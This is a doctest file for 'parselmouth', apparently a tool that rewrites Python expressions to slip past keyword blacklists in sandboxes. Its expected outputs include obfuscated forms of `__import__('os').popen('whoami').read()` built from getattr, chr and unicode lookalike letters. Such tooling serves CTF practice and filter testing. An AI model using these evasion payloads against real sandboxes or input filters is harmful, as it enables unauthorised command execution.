import functools

import parselmouth as p9h


def _test(t_cls, t_func, payload, kwd, rekwd, **xargs):
    p9h.BLACK_CHAR = {"kwd": kwd, "re_kwd": rekwd}

    if t_cls == "Bypass_Combo":
        bmap = xargs["maps"]
    else:
        bmap = {t_cls: [t_func]}

    p9h_ins = p9h.P9H(
        payload,
        specify_bypass_map={
            "white": dict(
                {
                    i: []
                    for i in vars(p9h.bypass_tools)
                    if i.startswith("Bypass_") and i != t_cls
                },
                **bmap
            ),
            "black": [],
        },
        depth=1,
        versbose=0,
    )
    print(p9h_ins.visit())


def test_Int():
    """
    >>> _test = functools.partial(_test, "Bypass_Int")
    >>> # ---------------------------------------------------

    >>> # ----- 小数字 -----
    >>> _test("by_trans", "1", ["1", ], "1")
    True

    >>> _test("by_cal", "1", ["1", ], "1")
    9**0

    >>> _test("by_unicode", "1", ["1", ], "1")
    int('𝟣')

    >>> _test("by_hex", "19", ["9"], "9")
    0x13

    >>> _test("by_bin", "9", ["9"], "9")
    0b1001

    >>> _test("by_ord", "19", ["19"], "19")
    ord('\\x13')

    >>> _test("by_ord", "10", ["1", "0"], "0|1")
    ord('\\n')

    >>> _test("by_ord", "9", ["1", "0", "9"], "0|1|9")
    ord('\\t')

    >>> _test("by_cal", "-1", ["1", ], "1")
    -2+True

    >>> _test("by_unicode", "-1", ["1", ], "1")
    int('-𝟣')

    >>> # ----- 大数字 -----
    >>> _test("by_bin", "2024", ["2", "4"], "2|4")
    0b11111101000

    >>> _test("by_hex", "2024", ["2", "4"], "2|4")
    0x7e8

    >>> _test("by_cal", "2024", ["0", "1", "3", "4", "5", "6", "7", "8"], "[0|1|3-8]")
    -2+2**2*9**2*(2+2**2)+9**2+True

    >>> _test("by_ord", "2024", ["0", "1", "2", "3", "4", "5", "6", "7", "8", "9"], "\\d")
    ord('ߨ')

    >>> _test("by_unicode", "2024", ["0", "1", "2", "3", "4", "5", "6", "7", "8", "9"], "[0-9]")
    int('𝟤𝟢𝟤𝟦')

    >>> _test("by_hex", "-2024", ["2", "4"], "2|4")
    -0x7e8

    >>> _test("by_ord", "-2024", ["0", "1", "2", "3", "4", "5", "6", "7", "8", "9"], "\\d")
    -ord('ߨ')

    >>> _test("by_cal", "-2024", ["2", "4"], "2|4")
    1-567-9**3*(1+3-len(str(())))

    >>> _test("by_cal", "-2024", ["0", "1", "3", "4", "5", "6", "7", "8"], "0|1|[3-8]")
    -9**2*(2**2*(2+2**2)+9**False)+True

    >>> _test("by_cal", "-2024", ["0", "1", "2", "3", "4", "5", "6", "7", "8"], "[0-8]")
    True-9**len(str(()))*(len(str(()))**len(str(()))*(len(str(()))**len(str(()))+True-(9-len(str(()))-(len(str(()))**len(str(()))+True-(9-len(str(()))-(True+9)))))+9**False)

    >>> _test("by_cal", "-2024", ["0", "1", "2", "3", "4", "5", "6", "7", "8", "9"], "[0-9]")
    True-(len(str(()))**len(str(()))*(len(str(()))**len(str(()))*(len(str(()))**len(str(()))*(len(str(()))**len(str(()))*(len(str(()))**len(str(()))+len(str(()))**len(str(()))-len(str(()))**False)+len(str(()))**len(str(()))-len(str(()))**False)+True+len(str(()))**False)+True+len(str(()))**False)+len(str(()))**False)
    """


def test_String():
    """
    >>> _test = functools.partial(_test, "Bypass_String")
    >>> # ---------------------------------------------------

    >>> # ----- 特殊测试 -----
    >>> _test("by_empty_str", "''", ["'", '"'], "'|\\"")
    str()

    >>> # ----- 引号限制 -----
    >>> _test("by_quote_trans", "'macr0phag3'", ["'", ], "'")
    "macr0phag3"

    >>> _test("by_quote_trans", "'你好世界'", ["'", ], "'")
    "你好世界"

    >>> _test("by_dict", "'macr0phag3'", ["'", '"'], "'|\\"")
    list(dict(macr0phag3=()))[0]

    >>> _test("by_dict", "'你好世界'", ["'", '"'], "'|\\"")
    list(dict(你好世界=()))[0]

    >>> # ----- 部分字符限制 -----
    >>> _test("by_char_add", "'macr0phag3'", ["mac", ], "mac")
    ('m'+'a'+'c'+'r'+'0'+'p'+'h'+'a'+'g'+'3')

    >>> _test("by_char_add", "'macr0phag3'", ["mac", "+"], "mac|\\+")
    ''.join(('m','a','c','r','0','p','h','a','g','3'))

    >>> _test("by_hex_encode", "'macr0phag3'", ["mac", ], "mac")
    '\\x6d\\x61\\x63\\x72\\x30\\x70\\x68\\x61\\x67\\x33'

    >>> _test("by_unicode_encode", "'macr0phag3'", ["mac", ], "mac")
    '\\u006d\\u0061\\u0063\\u0072\\u0030\\u0070\\u0068\\u0061\\u0067\\u0033'

    >>> _test("by_char_format", "'macr0phag3'", ["mac", ], "mac")
    '%c%c%c%c%c%c%c%c%c%c'%(109,97,99,114,48,112,104,97,103,51)

    >>> _test("by_format", "'macr0phag3'", ["mac", ], "mac")
    '{}{}{}{}{}{}{}{}{}{}'.format(chr(109),chr(97),chr(99),chr(114),chr(48),chr(112),chr(104),chr(97),chr(103),chr(51))

    >>> _test("by_char", "'macr0phag3'", ["mac", ], "mac")
    (chr(109)+chr(97)+chr(99)+chr(114)+chr(48)+chr(112)+chr(104)+chr(97)+chr(103)+chr(51))

    >>> _test("by_reverse", "'macr0phag3'", ["mac", ], "mac")
    '3gahp0rcam'[::-1]

    >>> _test("by_bytes_single", "'macr0phag3'", ["mac", ], "mac")
    (str(bytes([109]))[2]+str(bytes([97]))[2]+str(bytes([99]))[2]+str(bytes([114]))[2]+str(bytes([48]))[2]+str(bytes([112]))[2]+str(bytes([104]))[2]+str(bytes([97]))[2]+str(bytes([103]))[2]+str(bytes([51]))[2])

    >>> _test("by_bytes_full", "'macr0phag3'", ["mac", ], "mac")
    bytes([109,97,99,114,48,112,104,97,103,51]).decode()

    >>> # ----- 非 ascii 码字符测试 -----
    >>> _test("by_char_add", "'你好世界'", ["你好", ], "你好")
    ('你'+'好'+'世'+'界')

    >>> _test("by_unicode_encode", "'你好世界'", ["你好", ], "你好")
    '\\u4f60\\u597d\\u4e16\\u754c'

    >>> _test("by_char_format", "'你好世界'", ["你好", ], "你好")
    '%c%c%c%c'%(20320,22909,19990,30028)

    >>> _test("by_format", "'你好世界'", ["你好", ], "你好")
    '{}{}{}{}'.format(chr(20320),chr(22909),chr(19990),chr(30028))

    >>> _test("by_char", "'你好世界'", ["你好", ], "你好")
    (chr(20320)+chr(22909)+chr(19990)+chr(30028))

    >>> _test("by_reverse", "'你好世界'", ["你好", ], "你好")
    '界世好你'[::-1]
    """


def test_Name():
    """
    >>> _test = functools.partial(_test, "Bypass_Name")
    >>> # ---------------------------------------------------

    >>> _test("by_unicode", "__import__", ["__", ], "__")
    _＿import_＿

    >>> _test("by_unicode", "__import__", ["_i", ], "_i")
    __𝒊mport__

    >>> _test("by_unicode", "__import__", ["imp", "rt"], "imp|rt")
    __𝒊mpo𝒓t__

    >>> _test("by_builtins", "__import__", [], "^__import__$")
    __builtins__.__import__

    >>> _test("by_unicode", "dict(a=__import__)", ["__i"], "__i")
    dict(a=_＿import__)

    >>> _test("by_builtins", "dict(a=__import__)", [], "^__import__$")
    dict(a=__builtins__.__import__)
    """


def test_Attribute():
    """
    >>> _test = functools.partial(_test, "Bypass_Attribute")
    >>> # ---------------------------------------------------

    >>> _test("by_getattr", "os.system", [".", ], "\\.")
    getattr(os,'system')

    >>> _test("by_vars", "os.system", [".", ], "\\.")
    vars(os)['system']

    >>> _test("by_vars", "(1+1).system", [".", ], "\\.")
    (1+1).system

    >>> _test("by_dict_attr", "os.system", [".system", ], "\\.system")
    os.__dict__['system']

    >>> _test("by_dict_attr", "(1+1).system", [".", ], "\\.")
    (1+1).system
    """


def test_Keyword():
    """
    >>> _test = functools.partial(_test, "Bypass_Keyword")
    >>> # ---------------------------------------------------

    >>> _test("by_unicode", "dict(abc=1)", ["abc", ], "abc")
    dict(𝒂bc=1)

    # ----- 不能进行 bypass -----
    >>> _test("by_unicode", "dict(__import__=1)", ["imp", "𝒊"], "imp|𝒊")
    dict(__import__=1)
    """


def test_BoolOp():
    """
    >>> _test = functools.partial(_test, "Bypass_BoolOp")
    >>> # ---------------------------------------------------

    >>> _test("by_bitwise", "'yes' if 1 and (2 or 3) or 2 and 3 else 'no'", ["or", "and"], "or|and")
    'yes' if 1&(2|3)|2&3 else 'no'

    >>> _test("by_arithmetic", "'yes' if (__import__ and (2 or 3)) or (2 and 3) else 'no'", ["or", "and"], "or|and")
    'yes' if ((__import__ and bool(2)+bool(3)) or bool(2)*bool(3)) else 'no'
    """


def test_Combo():
    """
    >>> # 组合测试
    >>> _test = functools.partial(_test, "Bypass_Combo")
    >>> # ---------------------------------------------------

    >>> # ----- Int -----
    >>> maps = {"Bypass_Int": ["by_cal"]}; _test(..., "1", ["0", "1", "2", "3", "4", "5", "6", "7", "8", "9", "True", "all"], "\\d|all|True", maps=maps)
    len(str(()))**False

    >>> maps = {"Bypass_Int": ["by_cal"]}; _test(..., "12", ["1", "2", "True"], "1|2|True", maps=maps)
    4**len(str(()))+0**0-5

    >>> maps = {"Bypass_Int": ["by_trans"]}; _test(..., "1", ["1", "True", "all", "(", "*", "+"], "1|True|all|\\(|\\*|\\+", maps=maps)
    -~False

    >>> maps = {"Bypass_Int": ["by_trans"]}; _test(..., "2", ["2", "True"], "2|True", maps=maps)
    len(str(()))

    >>> maps = {"Bypass_Int": ["by_cal"]}; _test(..., "1", ["0", "1", "3", "4", "5", "6", "7", "8", "True", "False", "*", "+"], "[0|1|3-8]|True|False|\\*|\\+", maps=maps)
    all(())

    >>> maps = {"Bypass_Int": ["by_cal"]}; _test(..., "-1", ["0", "1", "3", "4", "5", "6", "7", "8", "a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z", "True", "False", "*"], "[0|1|3-8|a-z|True|False|\\*]", maps=maps)
    9-2-(2+9+9-2-(9+2-(9-2-(2+2+2))))

    >>> maps = {"Bypass_Int": ["by_cal"]}; _test(..., "-1", ["0", "1", "2", "3", "4", "5", "6", "7", "8", "9", "*", "+"], "[0-9|\\*|\\+]", maps=maps)
    True-len(str(()))

    >>> maps = {"Bypass_Int": ["by_cal"]}; _test(..., "1000", ["0", "1", "2", "3", "4", "5", "6", "7", "9", "-", "*", "True", "False"], "[0-6|7|9|\\-|\\*]|True|False", maps=maps)
    8+8+8+8+8+8+8+8+8+8+8+8+8+8+888

    >>> maps = {"Bypass_Int": ["by_cal"]}; _test(..., "2024", ["0", "1", "3", "4", "5", "6", "7", "8", "True", "False", "*"], "[0|1|3-8]|True|False|\\*", maps=maps)
    9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+2+9+9-2-(9+2-(2+9-all(())-9))

    >>> maps = {"Bypass_Int": ["by_cal"]}; _test(..., "2024", ["1", "2", "4", "*"], "1|2|4|\\*", maps=maps)
    9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+9+998

    >>> # ----- String -----
    >>> maps = {"Bypass_String": ["by_char_add", "by_dict"]}; _test(..., "'macr0phag3'", ["'", "\\"", "mac"], "'|\\"|mac", maps=maps)
    (list(dict(m=()))[0]+list(dict(a=()))[0]+list(dict(c=()))[0]+list(dict(r=()))[0]+list(dict(a0=()))[0][1:]+list(dict(p=()))[0]+list(dict(h=()))[0]+list(dict(a=()))[0]+list(dict(g=()))[0]+list(dict(a3=()))[0][1:])

    >>> maps = {"Bypass_String": ["by_char_add", "by_hex_encode"]}; _test(..., "'__import__'", ["__", "o"], "__|o", maps=maps)
    ('_'+'_'+'i'+'m'+'p'+'\\x6f'+'r'+'t'+'_'+'_')

    >>> maps = {"Bypass_String": ["by_char_add", "by_unicode_encode"]}; _test(..., "'__import__'", ["__", "o"], "__|o", maps=maps)
    ('_'+'_'+'i'+'m'+'p'+'\\u006f'+'r'+'t'+'_'+'_')

    >>> maps = {"Bypass_String": ["by_char_add", "by_char_format"]}; _test(..., "'__import__'", ["__", "o"], "__|o|𝒐", maps=maps)
    ('_'+'_'+'i'+'m'+'p'+'%c'%111+'r'+'t'+'_'+'_')

    >>> maps = {"Bypass_String": ["by_char_add", "by_format", "by_char"]}; _test(..., "'__import__'", ["__", "'", '"'], "__|'|\\"", maps=maps)
    ((chr(123)+chr(125)).format(chr(95))+(chr(123)+chr(125)).format(chr(95))+(chr(123)+chr(125)).format(chr(105))+(chr(123)+chr(125)).format(chr(109))+(chr(123)+chr(125)).format(chr(112))+(chr(123)+chr(125)).format(chr(111))+(chr(123)+chr(125)).format(chr(114))+(chr(123)+chr(125)).format(chr(116))+(chr(123)+chr(125)).format(chr(95))+(chr(123)+chr(125)).format(chr(95)))

    >>> maps = {"Bypass_String": ["by_char_add", "by_char"]}; _test(..., "'__import__'", ["__", "o"], "__|o", maps=maps)
    ('_'+'_'+'i'+'m'+'p'+chr(111)+'r'+'t'+'_'+'_')

    >>> maps = {"Bypass_String": ["by_char_add", "by_bytes_single"]}; _test(..., "'__import__'", ["__", "i"], "__|i", maps=maps)
    ('_'+'_'+str(bytes([105]))[2]+'m'+'p'+'o'+'r'+'t'+'_'+'_')

    >>> maps = {"Bypass_String": ["by_char_add", "by_bytes_full"]}; _test(..., "'__import__'", ["__", "i"], "__|i", maps=maps)
    ('_'+'_'+bytes([105]).decode()+'m'+'p'+'o'+'r'+'t'+'_'+'_')

    >>> maps = {"Bypass_String": ["by_hex_encode", "by_dict"], "Bypass_Name": ["by_unicode"], "Bypass_Keyword": ["by_unicode"]}; _test(..., "'__import__'", ["__", "x"], "__|x", maps=maps)
    ma𝒙(dict(_＿import_＿=()))

    >>> # ----- Attribute -----
    >>> maps = {"Bypass_Attribute": ["by_getattr"], "Bypass_String": ["by_dict"], "Bypass_Keyword": ["by_unicode"]}; _test(..., "os.system", [".", "sys", '"', "'"], "\\.|sys|'|\\"", maps=maps)
    getattr(os,max(dict(𝒔ystem=())))

    >>> maps = {"Bypass_Attribute": ["by_vars"], "Bypass_String": ["by_dict"], "Bypass_Keyword": ["by_unicode"]}; _test(..., "os.system", [".", "sys", '"', "'"], "\\.|sys|'|\\"", maps=maps)
    vars(os)[max(dict(𝒔ystem=()))]

    >>> # ----- Name -----
    >>> maps = {"Bypass_Name": ["by_builtins"], "Bypass_String": ["by_char_add", "by_char"], "Bypass_Attribute": ["by_getattr"]}; _test(..., "__import__", [".", "import", '"', "'"], "\\.|import|'|\\"", maps=maps)
    getattr(__builtins__,(chr(95)+chr(95)+chr(105)+chr(109)+chr(112)+chr(111)+chr(114)+chr(116)+chr(95)+chr(95)))

    >>> # ----- Integrated -----
    >>> maps = {"Bypass_Name": ["by_builtins"], "Bypass_String": ["by_char_add", "by_char"], "Bypass_Attribute": ["by_getattr"]}; _test(..., "__import__('os').popen('whoami').read()", [".", "import", '"', "'"], "\\.|import|'|\\"", maps=maps)
    getattr(getattr(getattr(__builtins__,chr(95)+chr(95)+chr(105)+chr(109)+chr(112)+chr(111)+chr(114)+chr(116)+chr(95)+chr(95))(chr(111)+chr(115)),chr(112)+chr(111)+chr(112)+chr(101)+chr(110))(chr(119)+chr(104)+chr(111)+chr(97)+chr(109)+chr(105)),(chr(114)+chr(101)+chr(97)+chr(100)))()

    >>> maps = {"Bypass_Name": ["by_unicode"], "Bypass_String": ["by_char", "by_char_add", "by_char_format"], "Bypass_Attribute": ["by_getattr"]}; _test(..., "__import__('os').popen('whoami').read()", ["__", ".", "'", '"', "read", "chr"], "__|\\.|'|\\"|read|chr", maps=maps)
    getattr(getattr(_＿import_＿((𝒄hr(37)+𝒄hr(99))%111+(𝒄hr(37)+𝒄hr(99))%115),(𝒄hr(37)+𝒄hr(99))%112+(𝒄hr(37)+𝒄hr(99))%111+(𝒄hr(37)+𝒄hr(99))%112+(𝒄hr(37)+𝒄hr(99))%101+(𝒄hr(37)+𝒄hr(99))%110)((𝒄hr(37)+𝒄hr(99))%119+(𝒄hr(37)+𝒄hr(99))%104+(𝒄hr(37)+𝒄hr(99))%111+(𝒄hr(37)+𝒄hr(99))%97+(𝒄hr(37)+𝒄hr(99))%109+(𝒄hr(37)+𝒄hr(99))%105),((𝒄hr(37)+𝒄hr(99))%114+(𝒄hr(37)+𝒄hr(99))%101+(𝒄hr(37)+𝒄hr(99))%97+(𝒄hr(37)+𝒄hr(99))%100))()

    >>> maps = {"Bypass_Name": ["by_unicode"], "Bypass_String": ["by_char", "by_char_add", "by_char_format"], "Bypass_Attribute": ["by_getattr"], "Bypass_Int": ["by_cal"],}; _test(..., "__import__('os').popen('whoami').read()", ["__", ".", "'", '"', "read", "chr", "0", "1"], "__|\\.|'|\\"|read|chr|0|1", maps=maps)
    getattr(getattr(_＿import_＿((𝒄hr(37)+𝒄hr(99))%(-5**2+7+7**2+9**2-True)+(𝒄hr(37)+𝒄hr(99))%(34+9**2)),(𝒄hr(37)+𝒄hr(99))%(-5**2+7**2+8+9**2-True)+(𝒄hr(37)+𝒄hr(99))%(-5**2+7+7**2+9**2-True)+(𝒄hr(37)+𝒄hr(99))%(-5**2+7**2+8+9**2-True)+(𝒄hr(37)+𝒄hr(99))%(5**2-6+9**2+True)+(𝒄hr(37)+𝒄hr(99))%(29+9**2))((𝒄hr(37)+𝒄hr(99))%(38+9**2)+(𝒄hr(37)+𝒄hr(99))%(23+9**2)+(𝒄hr(37)+𝒄hr(99))%(-5**2+7+7**2+9**2-True)+(𝒄hr(37)+𝒄hr(99))%97+(𝒄hr(37)+𝒄hr(99))%(28+9**2)+(𝒄hr(37)+𝒄hr(99))%(24+9**2)),((𝒄hr(37)+𝒄hr(99))%(33+9**2)+(𝒄hr(37)+𝒄hr(99))%(5**2-6+9**2+True)+(𝒄hr(37)+𝒄hr(99))%97+(𝒄hr(37)+𝒄hr(99))%(5**2-7+9**2+True)))()
    """
